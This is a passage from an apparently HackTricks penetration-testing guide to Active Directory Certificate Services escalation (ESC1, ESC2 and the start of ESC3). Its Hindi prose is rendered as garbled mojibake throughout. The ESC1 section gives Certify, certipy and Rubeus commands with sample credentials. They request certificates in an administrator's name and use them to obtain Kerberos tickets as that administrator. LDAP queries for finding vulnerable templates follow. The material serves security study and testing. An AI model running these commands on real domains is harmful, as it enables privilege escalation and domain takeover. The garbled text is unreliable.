# AD CS рдбреЛрдореЗрди рдПрд╕реНрдХреЗрд▓реЗрд╢рди

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>

## рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкреНрд▓реЗрдЯреНрд╕ - ESC1

### рд╡реНрдпрд╛рдЦреНрдпрд╛

* **Enterprise CA** **рдирд┐рдореНрди-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдирд╛рдорд╛рдВрдХрди рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ**
* **рдореИрдиреЗрдЬрд░ рдЕрдкреНрд░реВрд╡рд▓ рдЕрдХреНрд╖рдо рд╣реИ**
* **рдХреЛрдИ рдЕрдзрд┐рдХреГрдд рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реИрдВ**
* рдПрдХ рдЕрддреНрдпрдзрд┐рдХ рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓рд╛ **рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкреНрд▓реЗрдЯ** рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╡рд░рдг **рдирд┐рдореНрди-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдирд╛рдорд╛рдВрдХрди рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ**
* **рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкреНрд▓реЗрдЯ EKUs рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рддреЗ рд╣реИрдВ**:
* _Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), рдпрд╛ рдХреЛрдИ EKU рдирд╣реАрдВ (SubCA)._
* **рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкреНрд▓реЗрдЯ CSR рдореЗрдВ рдПрдХ subjectAltName рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛рдУрдВ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:**
* **AD** рдПрдХ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХреЗ **subjectAltName** (SAN) рдлрд╝реАрд▓реНрдб рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдкрд╣рдЪрд╛рди рдХрд╛ **рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛** рдпрджрд┐ рд╡рд╣ **рдореМрдЬреВрдж рд╣реИ**. рдирддреАрдЬрддрди, рдпрджрд┐ рдПрдХ рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ CSR рдореЗрдВ SAN рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ **рдХрд┐рд╕реА рдХреЗ рд░реВрдк рдореЗрдВ рднреА рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддрд╛ рд╣реИ** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рдбреЛрдореЗрди рдПрдбрдорд┐рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛). рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХрд╛ AD рдСрдмреНрдЬреЗрдХреНрдЯ **рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ** рдХрд┐ рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ **SAN рдХреЛ CSR рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рдпрд╛ рдирд╣реАрдВ, рдЗрд╕рдХреЗ **`mspki-certificate-name-`**`flag` рдкреНрд░реЙрдкрд░реНрдЯреА рдореЗрдВ. `mspki-certificate-name-flag` рдкреНрд░реЙрдкрд░реНрдЯреА рдПрдХ **рдмрд┐рдЯрдорд╛рд╕реНрдХ** рд╣реИ рдФрд░ рдпрджрд┐ **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** рдлреНрд▓реИрдЧ **рдореМрдЬреВрдж рд╣реИ**, рддреЛ **рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ SAN рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ.**

{% hint style="danger" %}
рдпреЗ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдПрдХ **рдирд┐рдореНрди-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдордирдорд╛рдиреЗ SAN рдХреЗ рд╕рд╛рде рдПрдХ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВ**, рдЬрд┐рд╕рд╕реЗ рдирд┐рдореНрди-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ Kerberos рдпрд╛ SChannel рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЛрдореЗрди рдореЗрдВ рдХрд┐рд╕реА рднреА рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИ.
{% endhint %}

рдпрд╣ рдЕрдХреНрд╕рд░ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЙрддреНрдкрд╛рджреЛрдВ рдпрд╛ рддреИрдирд╛рддреА рд╕реЗрд╡рд╛рдУрдВ рдХреЛ HTTPS рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯреНрд╕ рдпрд╛ рд╣реЛрд╕реНрдЯ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯреНрд╕ рдХреЛ рддреБрд░рдВрдд рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП. рдпрд╛ рдЬреНрдЮрд╛рди рдХреА рдХрдореА рдХреЗ рдХрд╛рд░рдг.

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЬрдм рдЗрд╕ рдЕрдВрддрд┐рдо рд╡рд┐рдХрд▓реНрдк рдХреЗ рд╕рд╛рде рдПрдХ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдПрдХ **рдЪреЗрддрд╛рд╡рдиреА рджрд┐рдЦрд╛рдИ рджреЗрддреА рд╣реИ**, рд▓реЗрдХрд┐рди рдпрд╣ рдирд╣реАрдВ рджрд┐рдЦрд╛рдИ рджреЗрддреА рд╣реИ рдпрджрд┐ рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд╕рд╛рде рдПрдХ **рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкреНрд▓реЗрдЯ** рдХреЛ **рдбреБрдкреНрд▓рд┐рдХреЗрдЯ** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬреИрд╕реЗ рдХрд┐ `WebServer` рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдЬрд┐рд╕рдореЗрдВ `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` рд╕рдХреНрд╖рдо рд╣реИ рдФрд░ рдлрд┐рд░ рдПрдбрдорд┐рди рдПрдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг OID рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ).

### рджреБрд░реБрдкрдпреЛрдЧ

**рдХрдордЬреЛрд░ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкреНрд▓реЗрдЯреНрд╕ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП** рдЖрдк рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
Certify.exe find /vulnerable
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
```
**рдЗрд╕ рдХрдордЬреЛрд░реА рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдкреНрд░рд╢рд╛рд╕рдХ рдХреА рдирдХрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдХреЛрдИ рдЪрд▓рд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
рддрдм рдЖрдк рдЙрддреНрдкрдиреНрди **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ `.pfx`** рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ **Rubeus рдпрд╛ certipy рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреБрдирдГ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows рдмрд╛рдЗрдирд░реАрдЬрд╝ "Certreq.exe" рдФрд░ "Certutil.exe" рдХрд╛ рдЙрдкрдпреЛрдЧ PFX рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдирд┐рдореНрди LDAP рдХреНрд╡реЗрд░реА рдЬрдм AD Forest рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реНрдХреАрдорд╛ рдХреЗ рдЦрд┐рд▓рд╛рдл рдЪрд▓рд╛рдИ рдЬрд╛рддреА рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкреНрд▓реЗрдЯреНрд╕ рдХреЛ рдЧрд┐рдирдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ **рдЕрдиреБрдореЛрджрди/рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА**, рдЬрд┐рдирдореЗрдВ **Client Authentication рдпрд╛ Smart Card Logon EKU** рд╣реЛрддрд╛ рд╣реИ, рдФрд░ рдЬрд┐рдирдореЗрдВ **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** рдлреНрд▓реИрдЧ рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИ:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкреНрд▓реЗрдЯреНрд╕ - ESC2

### рд╡реНрдпрд╛рдЦреНрдпрд╛

рджреВрд╕рд░реА рджреБрд░реБрдкрдпреЛрдЧ рдкрд░рд┐рджреГрд╢реНрдп рдкрд╣рд▓реЗ рдХрд╛ рдПрдХ рд╡рд┐рд╡рд┐рдзрддрд╛ рд╣реИ:

1. рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ CA рдХрдо-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдирд╛рдорд╛рдВрдХрди рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
2. рдореИрдиреЗрдЬрд░ рдЕрдиреБрдореЛрджрди рдЕрдХреНрд╖рдо рд╣реИред
3. рдХреЛрдИ рдЕрдзрд┐рдХреГрдд рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реИрдВред
4. рдПрдХ рдЕрддреНрдпрдзрд┐рдХ рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓рд╛ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╡рд░рдг рдХрдо-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдирд╛рдорд╛рдВрдХрди рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
5. **рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХрд┐рд╕реА рднреА рдЙрджреНрджреЗрд╢реНрдп EKU рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ рдпрд╛ рдХреЛрдИ EKU рдирд╣реАрдВред**

**рдХрд┐рд╕реА рднреА рдЙрджреНрджреЗрд╢реНрдп EKU** рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **рдХрд┐рд╕реА рднреА рдЙрджреНрджреЗрд╢реНрдп** рдХреЗ рд▓рд┐рдП **рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреИрд╕реЗ рдХрд┐ рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг, рд╕рд░реНрд╡рд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг, рдХреЛрдб рд╣рд╕реНрддрд╛рдХреНрд╖рд░, рдЖрджрд┐ред ESC3 рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЧрдИ **рд╡рд╣реА рддрдХрдиреАрдХ** рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред

**рдХреЛрдИ EKUs рдХреЗ рдмрд┐рдирд╛ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ**тАКтАФтАКрдПрдХ рдЕрдзреАрдирд╕реНрде CA рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯтАКтАФтАКрдХрд┐рд╕реА рднреА рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди **рдирдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯреНрд╕ рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдПрдХ рдЕрдзреАрдирд╕реНрде CA рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рдирдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯреНрд╕ рдореЗрдВ рдордирдорд╛рдиреЗ EKUs рдпрд╛ рдлреАрд▓реНрдбреНрд╕ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред**

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЕрдЧрд░ **рдЕрдзреАрдирд╕реНрде CA** **`NTAuthCertificates`** рдСрдмреНрдЬреЗрдХреНрдЯ рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдирд╣реАрдВ рд╣реИ (рдЬреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдирд╣реАрдВ рд╣реЛрдЧрд╛), рд╣рдорд▓рд╛рд╡рд░ **рдбреЛрдореЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдХрд░рдиреЗ рд╡рд╛рд▓реЗ **рдирдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯреНрд╕ рдирд╣реАрдВ рдмрдирд╛ рд╕рдХрддрд╛**ред рдлрд┐рд░ рднреА, рд╣рдорд▓рд╛рд╡рд░ рдХрд┐рд╕реА рднреА EKU рдХреЗ рд╕рд╛рде **рдирдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯреНрд╕ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ** рдФрд░ рдордирдорд╛рдиреЗ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдореВрд▓реНрдпреЛрдВ рдХреЗ рд╕рд╛рде, рдЬрд┐рдирдХрд╛ **рдмрд╣реБрдд** рджреБрд░реБрдкрдпреЛрдЧ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ (рдЬреИрд╕реЗ рдХреЛрдб рд╣рд╕реНрддрд╛рдХреНрд╖рд░, рд╕рд░реНрд╡рд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг, рдЖрджрд┐) рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдЕрдиреНрдп рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдмрдбрд╝реЗ рдкреНрд░рднрд╛рд╡ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ SAML, AD FS, рдпрд╛ IPSecред

рдирд┐рдореНрди LDAP рдХреНрд╡реЗрд░реА рдЬрдм AD рдлрд╝реЙрд░реЗрд╕реНрдЯ рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реНрдХреАрдорд╛ рдХреЗ рдЦрд┐рд▓рд╛рдл рдЪрд▓рд╛рдИ рдЬрд╛рддреА рд╣реИ, рддреЛ рдЗрд╕ рдкрд░рд┐рджреГрд╢реНрдп рд╕реЗ рдореЗрд▓ рдЦрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЯреЗрдореНрдкреНрд▓реЗрдЯреНрд╕ рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯ рдЯреЗрдореНрдкреНрд▓реЗрдЯреНрд╕ - ESC3

### рд╡реНрдпрд╛рдЦреНрдпрд╛

рдпрд╣ рдкрд░рд┐рджреГрд╢реНрдп рдкрд╣рд▓реЗ рдФрд░ рджреВрд╕рд░реЗ рдЬреИрд╕рд╛ рд╣реИ рд▓реЗрдХрд┐рди **рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░рддрд╛ рд╣реИ **рдПрдХ рдЕрд▓рдЧ EKU** (Certificate Request Agent) рдФрд░ **2 рдЕрд▓рдЧ рдЯреЗрдореНрдкреНрд▓реЗрдЯреНрд╕** (рдЗрд╕рд▓рд┐рдП рдЗрд╕рдореЗрдВ 2 рд╕реЗрдЯ рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ рд╣реИрдВ),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), рдЬрд┐рд╕реЗ Microsoft рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдореЗрдВ **Enrollment Agent** рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдХ рд╕рд┐рджреНрдзрд╛рдВрдд рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ **рджреВрд╕рд░реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдУрд░ рд╕реЗ рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд▓рд┐рдП рдПрдирд░реЛрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**.

**тАЬрдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯтАЭ** рдРрд╕реЗ **рдЯреЗрдореНрдкреНрд▓реЗрдЯ** рдореЗрдВ рдПрдирд░реЛрд▓ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдкрд░рд┐рдгрд╛рдореА **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рджреВрд╕рд░реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдУрд░ рд╕реЗ CSR рдХреЛ рд╕рд╣-рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддрд╛ рд╣реИ**. рдлрд┐рд░ рдпрд╣ **рд╕рд╣-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд CSR** рдХреЛ CA рдХреЛ **рднреЗрдЬрддрд╛ рд╣реИ**, рдПрдХ **рдЯреЗрдореНрдкреНрд▓реЗрдЯ** рдореЗрдВ рдПрдирд░реЛрд▓ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ **тАЬрджреВрд╕рд░реЗ рдХреА рдУрд░ рд╕реЗ рдПрдирд░реЛрд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИтАЭ**, рдФрд░ CA рдПрдХ **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд░рддрд╛ рд╣реИ рдЬреЛ тАЬрджреВрд╕рд░реЗтАЭ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рд╣реЛрддрд╛ рд╣реИ**.

**рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ 1:**

1. Enterprise CA рдХрдо-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдЕрдзрд┐рдХрд╛рд░ рджреЗрддрд╛ рд╣реИ.
2. рдореИрдиреЗрдЬрд░ рдЕрдиреБрдореЛрджрди рдЕрдХреНрд╖рдо рд╣реИ.
3. рдХреЛрдИ рдЕрдзрд┐рдХреГрдд рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реИрдВ.
